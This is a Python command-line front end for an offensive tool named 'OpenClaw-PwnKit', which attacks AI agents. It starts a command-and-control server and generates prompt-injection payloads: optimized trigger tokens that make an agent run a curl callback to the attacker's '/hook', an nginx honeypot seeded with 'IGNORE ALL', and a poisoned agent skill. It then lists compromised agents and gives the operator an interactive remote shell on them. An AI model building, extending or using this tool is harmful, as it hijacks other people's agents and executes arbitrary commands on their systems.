import cmd
import os
import sys
from rich.console import Console
from rich.table import Table
from core.c2_server import start_c2_server, COMPROMISED_AGENTS
from core.virtual_os import VirtualOS
from core.agent_comm import AgentCommunicator
from attacks.method1_naive import generate_naive_payload
from attacks.method2_cma_es import CMAESTokenOptimizer
from attacks.method3_honeypot import generate_nginx_honeypot
from attacks.method4_skills import generate_poisoned_skill

console = Console()

class PwnKitCLI(cmd.Cmd):
    intro = r"""
     ____                  ____ _               _   ____                 _  ___ _   
    / __ \                / ___| | __ ___      | | |  _ \__      ___ __ | |/ (_) |_ 
   | |  | | '_ \ / _ \   | |   | |/ _` \ \ /\ / /  | |_) \ \ /\ / / '_ \| ' /| | __|
   | |__| | |_) |  __/   | |___| | (_| |\ V  V /   |  __/ \ V  V /| | | | . \| | |_ 
    \____/| .__/ \___|    \____|_|\__,_| \_/\_/    |_|     \_/\_/ |_| |_|_|\_\_|\__|
          |_|                                                                       
    Advanced Black-Box RCE Zero-Order Optimization Framework for Agentic AI
    =======================================================================
    Type 'help' or '?' to list commands.
    """
    prompt = 'OpenClaw-PwnKit > '
    
    def __init__(self):
        super().__init__()
        self.c2_url = "http://YOUR_PUBLIC_IP:8000"
        self.active_sessions = {} # target_id -> (VirtualOS, AgentCommunicator)
        
        # 启动后台 C2
        console.print("[green][+] Starting C2 Server on 0.0.0.0:8000...[/green]")
        start_c2_server()

    def do_set_c2(self, arg):
        """Set the public URL for the C2 server (e.g., set_c2 http://1.2.3.4:8000)"""
        if arg:
            self.c2_url = arg.strip()
            console.print(f"[green][+] C2 URL set to {self.c2_url}[/green]")

    def do_generate_payload(self, arg):
        """
        Generate attack payloads.
        Usage: generate_payload [naive|cma|honeypot|skill]
        """
        method = arg.strip().lower()
        if method == "naive":
            payload = generate_naive_payload(self.c2_url)
            console.print("[yellow]Naive Payload:[/yellow]")
            print(payload)
            
        elif method == "cma":
            api_key = os.getenv("OPENAI_API_KEY")
            if not api_key:
                console.print("[red][!] Please set OPENAI_API_KEY environment variable.[/red]")
                return
            target_cmd = f"curl -X POST -d '{{\"target_id\":\"pwned\"}}' {self.c2_url}/hook"
            optimizer = CMAESTokenOptimizer(api_key, target_cmd)
            trigger = optimizer.optimize(max_generations=5, popsize=4) # 快速演示参数
            console.print(f"[green][+] Optimized Trigger found:[/green] {trigger}")
            
        elif method == "honeypot":
            generate_nginx_honeypot(self.c2_url, "IGNORE ALL", "./honeypot/")
            
        elif method == "skill":
            generate_poisoned_skill("system-optimizer", self.c2_url)
            
        else:
            console.print("[red]Invalid method. Choose: naive, cma, honeypot, skill[/red]")

    def do_sessions(self, arg):
        """List all compromised OpenClaw targets."""
        table = Table(title="Compromised Targets")
        table.add_column("Target ID", style="cyan")
        table.add_column("Webhook URL", style="magenta")
        table.add_column("Status", style="green")
        
        for tid, data in COMPROMISED_AGENTS.items():
            table.add_row(tid, data['webhook_url'], "Active")
            
        console.print(table)

    def do_interact(self, arg):
        """
        Interact with a compromised session.
        Usage: interact <target_id>
        """
        target_id = arg.strip()
        if target_id not in COMPROMISED_AGENTS:
            console.print("[red][!] Target ID not found.[/red]")
            return
            
        data = COMPROMISED_AGENTS[target_id]
        
        # 初始化会话
        if target_id not in self.active_sessions:
            vos = VirtualOS(target_id)
            comm = AgentCommunicator(data['webhook_url'], data['secret_key'])
            console.print("[yellow][*] Synchronizing state with remote agent...[/yellow]")
            if comm.sync_state(vos):
                self.active_sessions[target_id] = (vos, comm)
                console.print("[green][+] State synchronized. Entering Virtual Bash.[/green]")
            else:
                console.print("[red][!] Failed to sync state.[/red]")
                return
                
        self.virtual_bash(target_id)

    def virtual_bash(self, target_id):
        """进入针对该肉鸡的交互式虚拟 Bash"""
        vos, comm = self.active_sessions[target_id]
        console.print(f"\n[bold red]--- Pwned Terminal: {target_id} ---[/bold red]")
        console.print("Type 'exit' to return to PwnKit main menu.\n")
        
        while True:
            try:
                cmd_input = input(f"{target_id}@{vos.cwd}$ ").strip()
                if not cmd_input:
                    continue
                if cmd_input.lower() == 'exit':
                    break
                    
                # 拦截特定的本地模拟命令
                if cmd_input.startswith("cd "):
                    target_dir = cmd_input.split(" ", 1)[1]
                    # 发送远程确认
                    success, out = comm.execute_command(f"cd {target_dir} && pwd", vos)
                    if success:
                        vos.update_cwd(out.strip())
                    else:
                        print(f"cd: {target_dir}: No such file or directory")
                    continue
                    
                # 其他命令直接发送远端执行
                success, output = comm.execute_command(cmd_input, vos)
                if success:
                    print(output)
                else:
                    console.print(f"[red]Execution failed: {output}[/red]")
                    
            except KeyboardInterrupt:
                print()
                break

    def do_exit(self, arg):
        """Exit the framework."""
        console.print("[yellow]Exiting OpenClaw-PwnKit...[/yellow]")
        return True

if __name__ == '__main__':
    try:
        PwnKitCLI().cmdloop()
    except KeyboardInterrupt:
        print("\nExiting...")
        sys.exit(0)
```
